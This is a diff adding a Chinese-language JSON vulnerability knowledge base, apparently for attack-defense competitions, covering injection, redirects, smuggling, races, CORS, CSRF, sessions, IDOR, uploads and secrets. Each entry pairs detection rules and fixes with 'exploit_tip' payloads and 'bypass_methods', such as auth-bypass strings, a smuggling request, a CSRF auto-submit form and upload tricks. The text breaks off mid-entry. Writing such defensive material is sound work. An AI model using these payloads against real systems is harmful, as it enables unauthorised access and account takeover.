@@ -1,0 +1,1376 @@
+[
+ {
+  "name": "LDAP 注入",
+  "category": "ldap",
+  "language": "mixed",
+  "framework": "",
+  "severity": "high",
+  "description": "拼接 (&(uid=$user)(userPassword=$pass)) 时用 *)(uid=*))(|(uid=* 可绕过认证或枚举目录；常见于 AD/LDAP 登录、员工查询。",
+  "danger_functions": [
+   "ldap_search",
+   "DirContext.search",
+   "LdapTemplate"
+  ],
+  "code_patterns": [
+   "ldap_search(",
+   "search(",
+   "(&(uid="
+  ],
+  "input_sources": [
+   "请求参数 username/password"
+  ],
+  "match_rules": [
+   {
+    "rule_id": "kbldap-1",
+    "name": "LDAP 过滤拼接",
+    "type": "regex",
+    "pattern": "(ldap_search|search|LdapTemplate|DirContext)[\\s\\S]{0,80}(\\(uid=|\\(cn=)[\\\"']?\\s*\\+",
+    "severity": "high",
+    "priority": 1,
+    "description": "过滤条件字符串拼接用户输入"
+   },
+   {
+    "rule_id": "kbldap-2",
+    "name": "过滤未转义",
+    "type": "regex",
+    "pattern": "\\(uid=\\$|\\(&\\(uid=",
+    "severity": "high",
+    "priority": 2,
+    "description": "过滤串直接插入变量"
+   },
+   {
+    "rule_id": "kbldap-3",
+    "name": "通配符未过滤",
+    "type": "keyword",
+    "pattern": "\\(\\|\\(uid=\\*",
+    "severity": "critical",
+    "priority": 1,
+    "description": "典型注入 payload 特征"
+   }
+  ],
+  "fix_fast_method": "对过滤值转义：str_replace(['\\\\','*','(',')','\\0'], ['\\\\5c','\\\\2a','\\\\28','\\\\29','\\\\00'], $v)",
+  "fix_secure_method": "使用参数化 LDAP 查询（Java: SearchControls + 转义；PHP: ldap_escape($v, '', LDAP_ESCAPE_FILTER)）；\n只允许字母数字的账号名正则校验。",
+  "fix_code_example": "// PHP\n$u = ldap_escape($user, '', LDAP_ESCAPE_FILTER);\n$r = ldap_search($ds, $base, \"(&(uid={$u})(objectClass=person))\");",
+  "fix_code_language": "php",
+  "fix_summary": "LDAP 过滤值必须转义，否则可绕过认证。",
+  "exploit_tip": "username=*)(uid=*))(|(uid=*\npassword=x  →  返回第一个用户，登录成功",
+  "waf_template": "if (param matches '\\)\\(|\\*\\)\\('): block",
+  "waf_dependencies": "",
+  "whitelist_rule": "",
+  "blacklist_rule": ")(uid=*,*)(uid=*",
+  "framework_fix": "转义过滤字符；账号名正则白名单；WAF 拦截 LDAP 注入特征。",
+  "bypass_methods": [
+   "*)(|(uid=*",
+   "\\2a 编码通配符",
+   "null 字节截断"
+  ],
+  "false_positive": "误报：过滤串使用转义函数时安全。",
+  "tags": "ldap,injection,auth-bypass",
+  "references": [
+   "https://owasp.org/www-community/attacks/LDAP_Injection"
+  ]
+ },
+ {
+  "name": "XPath 注入",
+  "category": "xpath",
+  "language": "mixed",
+  "framework": "",
+  "severity": "high",
+  "description": "//user[username='$u' and password='$p'] 拼接时用 ' or '1'='1 可绕过认证；还可通过 count()/substring() 盲注读取整个 XML 文档。",
+  "danger_functions": [
+   "XPath",
+   "xpath_eval",
+   "XPathExpression"
+  ],
+  "code_patterns": [
+   "xpath(",
+   "XPathExpression",
+   "//user["
+  ],
+  "input_sources": [
+   "请求参数"
+  ],
+  "match_rules": [
+   {
+    "rule_id": "kbxpath-1",
+    "name": "XPath 拼接",
+    "type": "regex",
+    "pattern": "(\\/\\/\\w+\\[|xpath\\s*\\()[^\\n]{0,60}\\+",
+    "severity": "high",
+    "priority": 1,
+    "description": "XPath 表达式字符串拼接"
+   },
+   {
+    "rule_id": "kbxpath-2",
+    "name": "引号闭合 payload",
+    "type": "keyword",
+    "pattern": "'\\s*or\\s*'1'\\s*=\\s*'1",
+    "severity": "critical",
+    "priority": 1,
+    "description": "XPath 认证绕过特征"
+   },
+   {
+    "rule_id": "kbxpath-3",
+    "name": "未使用变量绑定",
+    "type": "regex",
+    "pattern": "XPathExpression[\\s\\S]{0,80}\\\\+",
+    "severity": "medium",
+    "priority": 2,
+    "description": "表达式拼接而非绑定变量"
+   }
+  ],
+  "fix_fast_method": "改用 XPath 变量绑定：$x->setParameter('u', $user) 配合 //user[username=$u]。",
+  "fix_secure_method": "使用编译后的 XPath 表达式 + 参数绑定；输入只允许 [A-Za-z0-9_.-]。",
+  "fix_code_example": "$xp = new DOMXPath($doc);\n$q = '//user[username=$u and password=$p]';\n$xp->evaluate($q, null, ['u'=>$user, 'p'=>$pass]);",
+  "fix_code_language": "php",
+  "fix_summary": "XPath 必须变量绑定，拼接等于注入。",
+  "exploit_tip": "username=' or '1'='1\nusername=x' or 1=1 or ''='",
+  "waf_template": "if (param matches \"'\\s*or\\s*'?1'?\\s*=\\s*'?1\"): block",
+  "waf_dependencies": "",
+  "whitelist_rule": "",
+  "blacklist_rule": "or 1=1,XPath",
+  "framework_fix": "变量绑定；输入白名单；WAF 拦截 or 1=1。",
+  "bypass_methods": [
+   "'] | //user[1] | //*[",
+   "concat() 盲注",
+   "count() 判断节点数"
+  ],
+  "false_positive": "误报：表达式使用绑定变量安全。",
+  "tags": "xpath,injection,auth-bypass",
+  "references": [
+   "https://owasp.org/www-community/attacks/XPATH_Injection"
+  ]
+ },
+ {
+  "name": "开放重定向",
+  "category": "open-redirect",
+  "language": "mixed",
+  "framework": "",
+  "severity": "medium",
+  "description": "登录后跳转 ?next=<url> 未校验，可把用户导向钓鱼站；AWD 中常配合 OAuth 授权码窃取。",
+  "danger_functions": [
+   "header('Location')",
+   "sendRedirect",
+   "res.redirect",
+   "redirect"
+  ],
+  "code_patterns": [
+   "Location:",
+   "sendRedirect(",
+   "res.redirect("
+  ],
+  "input_sources": [
+   "next",
+   "redirect_uri",
+   "return",
+   "url"
+  ],
+  "match_rules": [
+   {
+    "rule_id": "kbredirect-1",
+    "name": "重定向参数直接使用",
+    "type": "regex",
+    "pattern": "(header\\s*\\(\\s*['\\\"]Location:|sendRedirect\\s*\\(|res\\.redirect\\s*\\(|Redirect\\s*\\()[^;\\n]{0,60}(next|url|redirect|return|goto)",
+    "severity": "high",
+    "priority": 1,
+    "description": "重定向目标来自请求参数"
+   },
+   {
+    "rule_id": "kbredirect-2",
+    "name": "无白名单校验",
+    "type": "keyword",
+    "pattern": "(next|redirect|url)\\s*=\\s*(req|request|\\$_)",
+    "severity": "high",
+    "priority": 2,
+    "description": "直接取请求参数作为跳转目标"
+   },
+   {
+    "rule_id": "kbredirect-3",
+    "name": "协议相对跳转",
+    "type": "keyword",
+    "pattern": "//\\s*\\+|\\\"//\\\"",
+    "severity": "medium",
+    "priority": 3,
+    "description": "拼接 // 开头可跳转外站"
+   }
+  ],
+  "fix_fast_method": "跳转前校验：只允许以 / 开头且不以 // 开头的站内路径。",
+  "fix_secure_method": "使用映射表（next=home → /home）；或解析 URL 后校验 host 与本站一致；\nOAuth 场景 redirect_uri 必须精确匹配注册值。",
+  "fix_code_example": "$map = ['home'=>'/home','profile'=>'/profile'];\n$k = $_GET['next'] ?? 'home';\n$to = $map[$k] ?? '/home';\nheader('Location: '.$to);",
+  "fix_code_language": "php",
+  "fix_summary": "重定向目标只允许站内相对路径或映射表。",
+  "exploit_tip": "?next=//evil.com\n?next=https://evil.com\n?next=/\\evil.com",
+  "waf_template": "if (param matches '^(https?:)?//|^/\\\\'): block",
+  "waf_dependencies": "",
+  "whitelist_rule": "",
+  "blacklist_rule": "//evil.com,next=http",
+  "framework_fix": "映射表或相对路径校验；WAF 拦截 // 开头参数。",
+  "bypass_methods": [
+   "//evil.com",
+   "https:evil.com",
+   "/\\evil.com",
+   "%2f%2fevil.com",
+   "@good.com"
+  ],
+  "false_positive": "误报：跳转到固定常量安全。",
+  "tags": "open-redirect,oauth",
+  "references": [
+   "https://cwe.mitre.org/data/definitions/601.html"
+  ]
+ },
+ {
+  "name": "HTTP 请求走私（CL.TE / TE.CL / TE.TE）",
+  "category": "request-smuggling",
+  "language": "mixed",
+  "framework": "",
+  "severity": "high",
+  "description": "前端与后端对 Content-Length / Transfer-Encoding 解析不一致时，可走私请求绕过 WAF、毒化缓存、劫持他人会话；常见于 nginx+Tomcat、CDN+后端。",
+  "danger_functions": [
+   "Content-Length",
+   "Transfer-Encoding"
+  ],
+  "code_patterns": [
+   "Transfer-Encoding",
+   "Content-Length"
+  ],
+  "input_sources": [
+   "请求头"
+  ],
+  "match_rules": [
+   {
+    "rule_id": "kbsmuggle-1",
+    "name": "双长度头",
+    "type": "regex",
+    "pattern": "(?i)Transfer-Encoding\\s*:\\s*chunked[\\s\\S]{0,200}Content-Length",
+    "severity": "high",
+    "priority": 1,
+    "description": "同时出现 TE 与 CL，存在走私风险"
+   },
+   {
+    "rule_id": "kbsmuggle-2",
+    "name": "TE 混淆写法",
+    "type": "regex",
+    "pattern": "(?i)Transfer-Encoding\\s*:\\s*(chunked\\s*,|xchunked|chunked\\t| chunked)",
+    "severity": "high",
+    "priority": 1,
+    "description": "TE 头畸形写法可绕过前端解析"
+   },
+   {
+    "rule_id": "kbsmuggle-3",
+    "name": "CL 重复",
+    "type": "regex",
+    "pattern": "(?i)Content-Length\\s*:\\s*\\d+[\\s\\S]{0,60}Content-Length\\s*:\\s*\\d+",
+    "severity": "medium",
+    "priority": 2,
+    "description": "重复 Content-Length 头"
+   }
+  ],
+  "fix_fast_method": "nginx 层统一：proxy_http_version 1.1 且拒绝同时带 TE 与 CL 的请求。",
+  "fix_secure_method": "前后端统一使用 HTTP/2 或由同一层解析；nginx 加 if ($http_transfer_encoding) 规则；\n拒绝含两个 Content-Length 或 TE 值非法的请求。",
+  "fix_code_example": "if ($http_transfer_encoding != \"\") { return 400; }\n# 或\nproxy_set_header Transfer-Encoding \"\";",
+  "fix_code_language": "nginx",
+  "fix_summary": "走私可绕过 WAF 并劫持他人请求，需前后端解析一致。",
+  "exploit_tip": "POST / HTTP/1.1\nHost: t\nContent-Length: 6\nTransfer-Encoding: chunked\n\n0\n\nG",
+  "waf_template": "reject if (TE and CL both present) or malformed TE",
+  "waf_dependencies": "",
+  "whitelist_rule": "",
+  "blacklist_rule": "Transfer-Encoding,chunked",
+  "framework_fix": "统一解析层；拒绝 TE+CL 共存；WAF 校验头一致性。",
+  "bypass_methods": [
+   "TE: chunked 加空格/制表符",
+   "TE: xchunked",
+   "双 CL 不同值",
+   "TE 大小写变形"
+  ],
+  "false_positive": "误报：合法客户端只发 CL 或只发 TE。",
+  "tags": "request-smuggling,http",
+  "references": [
+   "https://portswigger.net/web-security/request-smuggling"
+  ]
+ },
+ {
+  "name": "条件竞争 / 竞态（TOCTOU）",
+  "category": "race-condition",
+  "language": "mixed",
+  "framework": "",
+  "severity": "high",
+  "description": "余额、库存、优惠券、上传临时文件等「先检查后使用」逻辑在并发下可重复利用，AWD 中常用于重复领 flag、绕过次数限制、重复提交。",
+  "danger_functions": [
+   "check-then-act",
+   "file_exists",
+   "UPDATE ... WHERE"
+  ],
+  "code_patterns": [
+   "file_exists(",
+   "SELECT ... FOR UPDATE",
+   "transaction"
+  ],
+  "input_sources": [
+   "并发请求"
+  ],
+  "match_rules": [
+   {
+    "rule_id": "kbrace-1",
+    "name": "检查后使用",
+    "type": "regex",
+    "pattern": "(file_exists|is_file)\\s*\\([^)]*\\)[\\s\\S]{0,120}(unlink|rename|include|copy)",
+    "severity": "high",
+    "priority": 1,
+    "description": "先检查再操作，存在 TOCTOU"
+   },
+   {
+    "rule_id": "kbrace-2",
+    "name": "无锁更新",
+    "type": "regex",
+    "pattern": "UPDATE\\s+\\w+\\s+SET\\s+\\w+\\s*=\\s*\\w+\\s*[-+]\\s*\\d+",
+    "severity": "high",
+    "priority": 2,
+    "description": "非原子读改写，可并发超额"
+   },
+   {
+    "rule_id": "kbrace-3",
+    "name": "事务隔离不足",
+    "type": "keyword",
+    "pattern": "SELECT\\s+[\\s\\S]{0,80}FOR\\s+UPDATE",
+    "severity": "medium",
+    "priority": 3,
+    "description": "使用 FOR UPDATE 需确认事务边界"
+   }
+  ],
+  "fix_fast_method": "用原子操作：UPDATE t SET stock=stock-1 WHERE id=? AND stock>0，检查 affected_rows。",
+  "fix_secure_method": "数据库层用原子条件更新或行锁 + 事务；文件操作用 O_EXCL 创建锁文件；\n幂等键（唯一索引）防止重复提交。",
+  "fix_code_example": "UPDATE coupon SET used=1 WHERE id=? AND used=0;\nif (mysqli_affected_rows($db) !== 1) { die('already used'); }",
+  "fix_code_language": "sql",
+  "fix_summary": "竞态要用数据库原子性与唯一约束解决，不能靠应用层检查。",
+  "exploit_tip": "# 并发 50 次同时提交领奖请求\nseq 50 | xargs -P50 -I{} curl -s -X POST -d 'id=1' http://t/claim",
+  "waf_template": "limit_req zone=api burst=5 nodelay;",
+  "waf_dependencies": "",
+  "whitelist_rule": "",
+  "blacklist_rule": "并发,race",
+  "framework_fix": "原子更新 + 唯一索引 + 限流；关键接口加幂等键。",
+  "bypass_methods": [
+   "并发 + 不同 session",
+   "HTTP/2 单连接多流",
+   "分块传输延长窗口"
+  ],
+  "false_positive": "误报：只读接口无竞态问题。",
+  "tags": "race-condition,business-logic",
+  "references": [
+   "https://portswigger.net/web-security/race-conditions"
+  ]
+ },
+ {
+  "name": "CORS 配置错误（任意源 + 凭证）",
+  "category": "cors",
+  "language": "mixed",
+  "framework": "",
+  "severity": "high",
+  "description": "Access-Control-Allow-Origin 反射 Origin 且 Allow-Credentials: true，任意站点可带 cookie 读取用户敏感数据。",
+  "danger_functions": [
+   "Access-Control-Allow-Origin",
+   "Allow-Credentials"
+  ],
+  "code_patterns": [
+   "Access-Control-Allow-Origin",
+   "Access-Control-Allow-Credentials"
+  ],
+  "input_sources": [
+   "Origin 头"
+  ],
+  "match_rules": [
+   {
+    "rule_id": "kbcors-1",
+    "name": "反射 Origin",
+    "type": "regex",
+    "pattern": "Access-Control-Allow-Origin[\\\"']?\\s*[,:]\\s*(\\$_(SERVER|GET)|request\\.headers|origin)",
+    "severity": "critical",
+    "priority": 1,
+    "description": "ACAO 直接使用请求 Origin"
+   },
+   {
+    "rule_id": "kbcors-2",
+    "name": "通配 + 凭证",
+    "type": "regex",
+    "pattern": "Allow-Origin\\s*[:=]\\s*[\\\"']?\\*[\\\"']?",
+    "severity": "high",
+    "priority": 1,
+    "description": "ACAO 为 *"
+   },
+   {
+    "rule_id": "kbcors-3",
+    "name": "null 源放行",
+    "type": "keyword",
+    "pattern": "Allow-Origin[\\\"']?\\s*[:=]\\s*[\\\"']?null",
+    "severity": "high",
+    "priority": 2,
+    "description": "允许 null 源，可被 sandbox iframe 利用"
+   }
+  ],
+  "fix_fast_method": "固定白名单：Access-Control-Allow-Origin: https://app.example.com",
+  "fix_secure_method": "维护域名白名单精确匹配（含协议与端口）；不使用 * 搭配 credentials；\n校验 Origin 用完整字符串比较而非 contains。",
+  "fix_code_example": "$allow = ['https://app.example.com'];\n$o = $_SERVER['HTTP_ORIGIN'] ?? '';\nif (in_array($o, $allow, true)) {\n  header(\"Access-Control-Allow-Origin: $o\");\n  header('Access-Control-Allow-Credentials: true');\n}",
+  "fix_code_language": "php",
+  "fix_summary": "CORS 必须精确白名单，反射 Origin + 凭证等于任意站可读数据。",
+  "exploit_tip": "Origin: https://evil.com → 响应 ACAO: https://evil.com + ACAC: true\nOrigin: null → 通过 sandbox iframe 利用",
+  "waf_template": "if (Origin not in allowlist): strip CORS headers",
+  "waf_dependencies": "",
+  "whitelist_rule": "",
+  "blacklist_rule": "Access-Control-Allow-Origin,*",
+  "framework_fix": "精确白名单；不用 * 配凭证；WAF 记录异常 Origin。",
+  "bypass_methods": [
+   "Origin: null",
+   "子域名后缀匹配 app.example.com.evil.com",
+   "大小写与尾斜杠差异"
+  ],
+  "false_positive": "误报：公开只读 API 用 * 且不带凭证属正常。",
+  "tags": "cors,misconfiguration",
+  "references": [
+   "https://portswigger.net/web-security/cors"
+  ]
+ },
+ {
+  "name": "CSRF 跨站请求伪造",
+  "category": "csrf",
+  "language": "mixed",
+  "framework": "",
+  "severity": "high",
+  "description": "状态变更接口只依赖 Cookie 认证且无 CSRF token / SameSite 保护，攻击者诱导管理员访问恶意页即可改密码、加管理员、发公告。",
+  "danger_functions": [
+   "csrf",
+   "SameSite",
+   "X-CSRF-Token"
+  ],
+  "code_patterns": [
+   "csrf",
+   "SameSite",
+   "verify_token"
+  ],
+  "input_sources": [
+   "Cookie 认证的表单/接口"
+  ],
+  "match_rules": [
+   {
+    "rule_id": "kbcsrf-1",
+    "name": "无 CSRF 校验的表单",
+    "type": "regex",
+    "pattern": "<form[^>]*method\\s*=\\s*[\\\"']?post[\\s\\S]{0,400}?</form>",
+    "severity": "medium",
+    "priority": 3,
+    "description": "POST 表单需确认含 CSRF token"
+   },
+   {
+    "rule_id": "kbcsrf-2",
+    "name": "Cookie 无 SameSite",
+    "type": "regex",
+    "pattern": "setcookie\\s*\\([^)]*\\)",
+    "severity": "medium",
+    "priority": 2,
+    "description": "setcookie 未设置 SameSite 属性"
+   },
+   {
+    "rule_id": "kbcsrf-3",
+    "name": "token 校验缺失",
+    "type": "keyword",
+    "pattern": "(csrf|_token|authenticity_token)",
+    "severity": "low",
+    "priority": 3,
+    "description": "检查是否实现 CSRF token 校验"
+   }
+  ],
+  "fix_fast_method": "表单加 token：<input type=hidden name=csrf value=<?= $token ?>>，提交时 hash_equals 校验。",
+  "fix_secure_method": "启用 SameSite=Lax/Strict + CSRF token 双重防护；敏感操作要求二次认证；\nAPI 用自定义头（X-Requested-With）或 Bearer token 而非 Cookie。",
+  "fix_code_example": "session_start();\nif (empty($_SESSION['csrf'])) $_SESSION['csrf'] = bin2hex(random_bytes(32));\n// 校验\nif (!hash_equals($_SESSION['csrf'], $_POST['csrf'] ?? '')) { die('CSRF'); }",
+  "fix_code_language": "php",
+  "fix_summary": "Cookie 认证的写操作必须带 CSRF token + SameSite。",
+  "exploit_tip": "<form action=\"http://t/admin/adduser\" method=POST id=f>\n<input name=user value=attacker>\n<script>document.getElementById('f').submit()</script>",
+  "waf_template": "if (POST and no X-CSRF-Token and Referer not same-origin): block",
+  "waf_dependencies": "",
+  "whitelist_rule": "",
+  "blacklist_rule": "csrf token,SameSite",
+  "framework_fix": "CSRF token + SameSite；敏感操作二次确认。",
+  "bypass_methods": [
+   "SameSite=Lax 下的 GET 请求",
+   "通过 302 绕过 Referer 校验",
+   "token 未绑定会话"
+  ],
+  "false_positive": "误报：纯 JSON API 使用 Bearer token 且校验 Content-Type 时风险低。",
+  "tags": "csrf",
+  "references": [
+   "https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html"
+  ]
+ },
+ {
+  "name": "会话固定 / Session 缺陷",
+  "category": "auth-bypass",
+  "language": "mixed",
+  "framework": "",
+  "severity": "high",
+  "description": "登录后不换发 SessionID（会话固定）、Session 存于 URL、cookie 缺 HttpOnly/Secure、或 session 反序列化不安全，均可导致账号接管。",
+  "danger_functions": [
+   "session_start",
+   "session_regenerate_id",
+   "PHPSESSID"
+  ],
+  "code_patterns": [
+   "session_start(",
+   "setcookie(",
+   "session_regenerate_id"
+  ],
+  "input_sources": [
+   "Cookie",
+   "URL 参数"
+  ],
+  "match_rules": [
+   {
+    "rule_id": "kbsess-1",
+    "name": "登录未换发会话",
+    "type": "regex",
+    "pattern": "session_start\\s*\\(\\s*\\)",
+    "severity": "medium",
+    "priority": 3,
+    "description": "需确认登录成功后调用 session_regenerate_id(true)"
+   },
+   {
+    "rule_id": "kbsess-2",
+    "name": "Cookie 缺 HttpOnly",
+    "type": "regex",
+    "pattern": "setcookie\\s*\\([^)]*\\)\\s*;",
+    "severity": "medium",
+    "priority": 2,
+    "description": "setcookie 未设置 httponly/secure/samesite"
+   },
+   {
+    "rule_id": "kbsess-3",
+    "name": "Session 写入用户输入",
+    "type": "regex",
+    "pattern": "\\$_SESSION\\[[^\\]]+\\]\\s*=\\s*\\$_(GET|POST|REQUEST)",
+    "severity": "high",
+    "priority": 2,
+    "description": "用户输入直接写入 session，可污染权限字段"
+   }
+  ],
+  "fix_fast_method": "登录成功后立即 session_regenerate_id(true)。",
+  "fix_secure_method": "php.ini 设 session.cookie_httponly=1、session.cookie_secure=1、session.use_strict_mode=1、\nsession.cookie_samesite=Lax；权限字段只从数据库读取。",
+  "fix_code_example": "session_start(['cookie_httponly'=>true,'cookie_secure'=>true,'cookie_samesite'=>'Lax','use_strict_mode'=>true]);\n// 登录成功后\nsession_regenerate_id(true);\n$_SESSION['uid'] = $row['id'];",
+  "fix_code_language": "php",
+  "fix_summary": "会话必须登录后换发 + HttpOnly/Secure/SameSite + 严格模式。",
+  "exploit_tip": "1. 攻击者先获取固定 PHPSESSID\n2. 诱导受害者用该 ID 登录\n3. 攻击者复用同一 ID 即接管",
+  "waf_template": "if (session cookie reused across login): regenerate",
+  "waf_dependencies": "",
+  "whitelist_rule": "",
+  "blacklist_rule": "PHPSESSID,session",
+  "framework_fix": "换发会话；加固 cookie 属性；use_strict_mode。",
+  "bypass_methods": [
+   "Session 固定 + XSS 组合",
+   "Cookie 作用域过大",
+   "URL 中携带 session id"
+  ],
+  "false_positive": "误报：静态站点无会话不适用。",
+  "tags": "session,auth-bypass",
+  "references": [
+   "https://owasp.org/www-community/attacks/Session_fixation"
+  ]
+ },
+ {
+  "name": "越权访问（IDOR / 水平垂直越权）",
+  "category": "auth-bypass",
+  "language": "mixed",
+  "framework": "",
+  "severity": "high",
+  "description": "接口用对象 ID 直接查库但不校验归属，改 id 即可读他人数据；或仅前端隐藏管理按钮，后端无角色校验。",
+  "danger_functions": [
+   "find(id)",
+   "where id=",
+   "is_admin"
+  ],
+  "code_patterns": [
+   "find(",
+   "findOne(",
+   "SELECT ... WHERE id="
+  ],
+  "input_sources": [
+   "id",
+   "uid",
+   "order_id"
+  ],
+  "match_rules": [
+   {
+    "rule_id": "kbidor-1",
+    "name": "按 ID 查库无归属校验",
+    "type": "regex",
+    "pattern": "(find|findOne|get|select)\\w*\\s*\\(\\s*(req\\.(params|query)\\.\\w+|\\\\?\\$_GET\\[)",
+    "severity": "high",
+    "priority": 1,
+    "description": "直接用请求 ID 查询，需确认校验归属"
+   },
+   {
+    "rule_id": "kbidor-2",
+    "name": "权限仅前端判断",
+    "type": "regex",
+    "pattern": "(is_admin|isAdmin|role)\\s*===?\\s*['\\\"]?admin",
+    "severity": "medium",
+    "priority": 2,
+    "description": "前端判断角色，需确认后端同步校验"
+   },
+   {
+    "rule_id": "kbidor-3",
+    "name": "管理接口无鉴权",
+    "type": "regex",
+    "pattern": "(/admin/|/manage/|/api/v1/admin)",
+    "severity": "medium",
+    "priority": 3,
+    "description": "管理路由需确认有服务端鉴权"
+   }
+  ],
+  "fix_fast_method": "查询加归属条件：WHERE id=? AND user_id=?（user_id 取自 session）。",
+  "fix_secure_method": "所有对象访问走统一授权层（如 policy/ability）；管理接口加角色中间件；\n对外使用不可枚举的 UUID 而非自增 ID。",
+  "fix_code_example": "$id = (int)$_GET['id'];\n$uid = (int)$_SESSION['uid'];\n$stmt = $pdo->prepare('SELECT * FROM orders WHERE id=? AND user_id=?');\n$stmt->execute([$id,$uid]);",
+  "fix_code_language": "php",
+  "fix_summary": "对象访问必须校验归属，管理接口必须服务端鉴权。",
+  "exploit_tip": "/api/order?id=1001 → 改成 1002 读他人订单\n/admin/user/list 直接访问",
+  "waf_template": "require role check middleware on /admin/*",
+  "waf_dependencies": "",
+  "whitelist_rule": "",
+  "blacklist_rule": "admin,id",
+  "framework_fix": "统一授权层 + 归属条件；管理路由鉴权中间件。",
+  "bypass_methods": [
+   "id 改为数组",
+   "uuid 泄露后仍可越权",
+   "通过 GraphQL 别名绕过"
+  ],
+  "false_positive": "误报：公开资源（公告）无归属要求。",
+  "tags": "idor,broken-access-control",
+  "references": [
+   "https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control"
+  ]
+ },
+ {
+  "name": "文件上传解析链（后缀 + 解析配置）",
+  "category": "upload",
+  "language": "mixed",
+  "framework": "",
+  "severity": "critical",
+  "description": "仅校验前端或黑名单后缀时，可用 .phtml/.php5/.phar/.htaccess/.user.ini、双后缀 a.php.jpg、%00 截断、大小写 PhP 绕过；配合 nginx 的 fastcgi 正则写 shell。",
+  "danger_functions": [
+   "move_uploaded_file",
+   "multipart",
+   "$_FILES"
+  ],
+  "code_patterns": [
+   "move_uploaded_file(",
+   "$_FILES",
+   "multipart/form-data"
+  ],
+  "input_sources": [
+   "$_FILES",
+   "multipart body"
+  ],
+  "match_rules": [
+   {
+    "rule_id": "kbupload-1",
+    "name": "仅黑名单后缀",
+    "type": "regex",
+    "pattern": "(in_array|preg_match)[^\\n]{0,120}(php|phtml|exe)\\b",
+    "severity": "high",
+    "priority": 2,
+    "description": "使用黑名单校验后缀"
+   },
+   {
+    "rule_id": "kbupload-2",
+    "name": "原始文件名拼接路径",
+    "type": "regex",
+    "pattern": "move_uploaded_file\\s*\\([^,]+,\\s*[^)]*\\\\?\\$_FILES\\[[^\\]]+\\]\\['name'\\]",
+    "severity": "critical",
+    "priority": 1,
+    "description": "使用客户端文件名作为保存路径，可穿越或双后缀"
+   },
+   {
+    "rule_id": "kbupload-3",
+    "name": "上传目录可执行",
+    "type": "regex",
+    "pattern": "(uploads?|files?|attach)[^\\n]{0,60}\\\\.(php|phtml|jsp)",
+    "severity": "high",
+    "priority": 2,
+    "description": "上传目录存在可执行脚本"
+   }
+  ],
+  "fix_fast_method": "保存名用 bin2hex(random_bytes(8)).'.jpg'；上传目录 nginx 禁执行。",
+  "fix_secure_method": "白名单后缀 + MIME + magic bytes 三重校验；文件名完全由服务端生成；\n上传目录单独 location 且 location ~ \\.php$ { deny all; }；图片二次渲染。",
+  "fix_code_example": "$ext = strtolower(pathinfo($_FILES['f']['name'], PATHINFO_EXTENSION));\nif (!in_array($ext, ['jpg','png','gif'], true)) { die('bad ext'); }\n$name = bin2hex(random_bytes(8)).'.'.$ext;\nmove_uploaded_file($_FILES['f']['tmp_name'], \"/data/up/$name\");",
+  "fix_code_language": "php",
+  "fix_summary": "上传必须白名单 + 服务端重命名 + 目录禁执行。",
+  "exploit_tip": "a.php.jpg + nginx 配置 cgi.fix_pathinfo=1 → /uploads/a.php.jpg/x.php 解析为 PHP\n.htaccess: AddType application/x-httpd-php .jpg",
+  "waf_template": "location /uploads/ { location ~ \\.(php|phtml|phar|php[0-9])$ { deny all; } }",
+  "waf_dependencies": "",
+  "whitelist_rule": "",
+  "blacklist_rule": ".phtml,.htaccess,.user.ini,%00",
+  "framework_fix": "白名单 + 重命名 + 目录禁执行；WAF 拦截危险后缀与双后缀。",
+  "bypass_methods": [
+   "a.php.jpg",
+   "a.PhP",
+   "a.php%00.jpg",
+   "a.php. 尾部点",
+   ".htaccess 覆盖解析"
+  ],
+  "false_positive": "误报：上传功能存在但已白名单校验时降级。",
+  "tags": "upload,webshell,bypass",
+  "references": [
+   "https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload"
+  ]
+ },
+ {
+  "name": "硬编码敏感凭据 / 密钥泄露",
+  "category": "weak-crypto",
+  "language": "mixed",
+  "framework": "",
+  "severity": "high",
+  "description": "源码或配置中硬编码数据库口令、API Key、JWT secret、云 AK/SK，AWD 中读源码或 .git 即可横向到数据库、对象存储。",
+  "danger_functions": [
+   "password",
+   "secret",
+   "api_key",
+   "AKID"
+  ],
+  "code_patterns": [
+   "password=",
+   "secret",
+   "AKID",
+   "BEGIN RSA PRIVATE KEY"
+  ],
+  "input_sources": [
+   "config 文件",
+   "源码",
+   "环境变量"
+  ],
+  "match_rules": [
+   {
+    "rule_id": "kbsecret-1",
+    "name": "硬编码口令",
+    "type": "regex",
+    "pattern": "(?i)(password|passwd|pwd)\\s*[:=]\\s*[\\\"'][^\\\"']{3,}[\\\"']",
+    "severity": "high",
+    "priority": 1,
+    "description": "配置/源码中硬编码口令"
+   },
+   {
+    "rule_id": "kbsecret-2",
+    "name": "云密钥",
+    "type": "regex",
+    "pattern": "(AKID[A-Za-z0-9]{13,}|LTAI[A-Za-z0-9]{12,})",
+    "severity": "critical",
+    "priority": 1,
+    "description": "阿里云 AccessKey 特征"
+   },
+   {
+    "rule_id": "kbsecret-3",
+    "name": "私钥文件",
+    "type": "keyword",
+    "pattern": "BEGIN (RSA |EC |OPENSSH )?PRIVATE KEY",
+    "severity": "critical",
+    "priority": 1,
+    "description": "源码中包含私钥"
+   }
+  ],
+  "fix_fast_method": "把凭据移到环境变量/密钥管理服务，并立即轮换已泄露的凭据。",
+  "fix_secure_method": "使用 Vault/KMS/环境变量注入；CI 中加 secret 扫描（gitleaks）；\n最小权限数据库账号，禁用 root 远程登录。",
+  "fix_code_example": "# docker-compose\nenvironment:\n  DB_PASSWORD: ${DB_PASSWORD}\n# 代码\n$pdo = new PDO($dsn, getenv('DB_USER'), getenv('DB_PASSWORD'));",
+  "fix_code_language": "bash",
+  "fix_summary": "凭据不能进代码库，泄露后必须轮换。",
+  "exploit_tip": "grep -rn 'password' . --include=*.php\ngit log -p | grep -i 'passwd\\|secret'",
+  "waf_template": "if (code matches 'AKID[0-9A-Za-z]{13,}'): alert",
+  "waf_dependencies": "",
+  "whitelist_rule": "",
+  "blacklist_rule": "password,secret,AKID",
+  "framework_fix": "凭据外置 + 轮换；CI secret 扫描。",
+  "bypass_methods": [
+   "base64 编码后硬编码",
+   ".env 未 gitignore",
+   "git 历史泄露"
+  ],
+  "false_positive": "误报：示例配置中的占位符（your_password）不构成泄露。",
+  "tags": "secret,hardcoded,credential",
+  "references": [
+   "https://owasp.org/www-community/vulnerabilities/Use_of_hard-coded_password"
+  ]
+ },
+ {
+  "name": "Redis 未授权访问",
+  "category": "rce",
+  "language": "mixed",
+  "framework": "",
+  "severity": "critical",
